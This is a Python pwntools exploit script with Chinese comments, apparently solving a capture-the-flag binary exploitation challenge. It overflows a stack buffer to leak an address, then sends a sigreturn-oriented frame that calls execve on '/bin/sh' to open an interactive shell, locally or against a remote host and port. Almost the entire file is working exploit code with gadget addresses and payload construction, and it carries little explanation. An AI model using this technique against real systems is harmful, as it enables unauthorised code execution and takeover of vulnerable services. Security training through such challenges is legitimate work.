from kk import*
context.binary = elf = ELF('./pwn')
context.log_level = 'debug'

# 根据是否远程自动选择 libc
if args.LIBC:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #记得改

rop = ROP(elf)

def go():
    if args.KK:
        return remote('192.168.127.12', 10001)
    else:
        return process(elf.path)

def pwn():
    p = go()

    # 如果带有 GDB 参数，则附加调试器
    if args.GDB:
        # 这里可以写默认的断点，比如 b main\nc
        GDB(p, 'vmmap')

    # ================= 你的利用代码写这里 =================
    vuln = 0x400531
    mov_rax_ret = 0x4004DA
    syscall_ret = 0x400517

    payload = b'a'*(0x10 ) + p64(vuln) 

    p.send(payload)
    addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
    print(hex(addr))

    payload = b'b'*(0x10) + p64(mov_rax_ret) + p64(syscall_ret) 
    sigframe = SigreturnFrame()
    sigframe.rax =  59   #context.SYS_execve
    sigframe.rdi =   addr - 48
    sigframe.rsi = 0
    sigframe.rdx = 0
    sigframe.rsp = syscall_ret
    sigframe.rip = syscall_ret
    print(hex(len(bytes(sigframe))))
    payload += bytes(sigframe).ljust(0x100, b'\x00') +  b"/bin/sh\x00"
    p.send(payload)

    # ======================================================

    p.interactive()

if __name__ == "__main__":
    pwn()